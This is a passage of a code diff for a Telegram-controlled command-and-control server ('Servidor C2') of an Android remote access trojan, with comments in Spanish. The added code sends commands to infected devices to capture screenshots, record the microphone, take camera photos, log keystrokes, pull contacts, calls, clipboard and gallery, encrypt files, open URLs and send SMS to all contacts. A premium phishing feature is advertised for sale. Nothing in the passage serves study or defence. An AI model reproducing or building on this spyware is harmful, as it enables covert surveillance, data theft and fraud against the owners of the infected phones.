-                case '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯': sendCommand(chatId, currentTargetId, commands.keyloggerOn); break;
-                case '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯': sendCommand(chatId, currentTargetId, commands.keyloggerOff); break;
-                
-                default:
-                    if (!currentAction) {
-                        bot.sendMessage(chatId, `Comando no reconocido o acción inválida.`, { parse_mode: 'HTML' });
-                    }
-                    break;
+        return bot.sendMessage(chatId, 
+            `<b>✯ Selecciona acción para realizar para ${deviceName}</b>\n\n`, 
+            { 
+                parse_mode: 'HTML',
+                reply_markup: { keyboard: actionKeyboard, resize_keyboard: true }
             }
+        );
+    }
+    
+    // --- LÓGICA DE FLUJO DE ACCIONES INTERACTIVAS (INPUTS) ---
+
+    // 1. Manejo de comandos que requieren un TARGET, pero no INPUT adicional
+    if (currentAction === 'await_command' && currentTargetId) {
+        let requestCommand = null;
+        let extras = [];
+
+        switch (text) {
+            case '✯ Screenshot ✯': requestCommand = 'screenshot'; break;
+            case '✯ Microphone ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_mic_duration' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa la duración de la grabación del micrófono en segundos</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Clipboard ✯': requestCommand = 'clipboard'; break;
+            case '✯ Calls ✯': requestCommand = 'calls'; break;
+            case '✯ Contacts ✯': requestCommand = 'contacts'; break;
+            case '✯ Apps ✯': requestCommand = 'apps'; break;
+            case '✯ File explorer ✯': requestCommand = 'file-explorer'; break;
+            case '✯ Gallery ✯': requestCommand = 'gallery'; break;
+            case '✯ Main camera ✯': requestCommand = 'main-camera'; break;
+            case '✯ Selfie Camera ✯': requestCommand = 'selfie-camera'; break;
+            case '✯ Keylogger ON ✯': requestCommand = 'keylogger-on'; break;
+            case '✯ Keylogger OFF ✯': requestCommand = 'keylogger-off'; break;
+            case '✯ Vibrate ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_vibrate_duration' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa la duración que quieres que el dispositivo vibre en segundos</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Toast ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_toast_text' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa un mensaje que quieres que aparezca en el cuadro de notificación (Toast)</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Pop notification ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_notification_text' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa texto que quieres que aparezca como notificación</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Open URL ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_url' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa la URL que quieres abrir</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Encrypt ✯': 
+                requestCommand = 'encrypt'; // Comando simple en el original
+                break;
+            case '✯ Decrypt ✯': 
+                requestCommand = 'decrypt'; // Comando simple en el original
+                break;
+            case '✯ Phishing ✯': 
+                return bot.sendMessage(chatId, '<b>✯ Esta opción solo está disponible en la versión premium dm to buy @sphanter</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ Send SMS ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_sms_number' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa un número de teléfono al que quieres enviar SMS</b>\n\n', { parse_mode: 'HTML' });
+            case '✯ SMS to all contacts ✯': 
+                appData.set(chatId, { target: currentTargetId, action: 'await_sms_all_text' });
+                return bot.sendMessage(chatId, '<b>✯ Ingresa texto que quieres enviar a todos los contactos</b>\n\n', { parse_mode: 'HTML' });
+            default:
+                // Si es cualquier otro texto, volvemos al menú principal
+                return bot.sendMessage(chatId, 'Comando no reconocido o acción inválida.', { reply_markup: MAIN_MENU_KEYBOARD });
         }
+        
+        if (requestCommand) {
+            sendCommand(currentTargetId, requestCommand, extras);
+        }
+        return;
+    }
+    
+    // 2. Manejo de INPUTS después de la solicitud inicial
+
+    if (currentAction === 'await_mic_duration' && !isNaN(text)) {
+        sendCommand(currentTargetId, 'microphone', [{ key: 'duration', value: text }]);
+    } 
+    else if (currentAction === 'await_vibrate_duration' && !isNaN(text)) {
+        sendCommand(currentTargetId, 'vibrate', [{ key: 'duration', value: text }]);
+    } 
+    else if (currentAction === 'await_toast_text') {
+        sendCommand(currentTargetId, 'toast', [{ key: 'toastText', value: text }]);
+    }
+    else if (currentAction === 'await_notification_text') {
+        sendCommand(currentTargetId, 'popNotification', [{ key: 'notificationText', value: text }]);
+    }
+    else if (currentAction === 'await_url') {
+        sendCommand(currentTargetId, 'url', [{ key: 'url', value: text }]);
+    }
+    else if (currentAction === 'await_sms_number') {
+        // Almacenar el número y cambiar de estado para pedir el texto
+        appData.set(chatId, { target: currentTargetId, action: 'await_sms_text', number: text });
+        bot.sendMessage(chatId, `<b>✯ Ahora ingresa un mensaje que quieres enviar a ${text}</b>\n\n`, { parse_mode: 'HTML' });
+    }
+    else if (currentAction === 'await_sms_text') {
+        const numberToSend = appData.get(chatId).number;
+        sendCommand(currentTargetId, 'sendSms', [
+            { key: 'smsNumber', value: numberToSend },
+            { key: 'smsText', value: text }
+        ]);
+    }
+    else if (currentAction === 'await_sms_all_text') {
+        sendCommand(currentTargetId, 'smsToAllContacts', [{ key: 'smsText', value: text }]);
+    } 
+    
+    else if (currentAction) {
+        // Si hay una acción en curso pero el input no es válido
+        bot.sendMessage(chatId, 'Entrada inválida. Cancela con "✯ Cancel action ✯" o intenta de nuevo.', { parse_mode: 'HTML' });
     }
 });
 
-// ----------------------------------------------------
-
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`[EXPRESS] Servidor escuchando en puerto ${PORT}`));
+// --- Iniciar Servidor ---
+server.listen(PORT, () => {
+    console.log(`[INFO] Servidor escuchando en el puerto ${PORT}`);
+    // Opcional: Mostrar mensaje inicial para verificar el token
+    bot.sendMessage(data.id, 
+        `[INFO] Servidor C2 iniciado y escuchando en ${PORT}.\n` +
+        `ID del Chat: ${data.id}\n` +
+        `Dispositivos conectados: ${io.sockets.size}`,
+        { parse_mode: 'HTML' }
+    ).catch(e => console.error("ERROR: No se pudo enviar el mensaje inicial a Telegram. Revisa el token y la ID de chat.", e));
+});
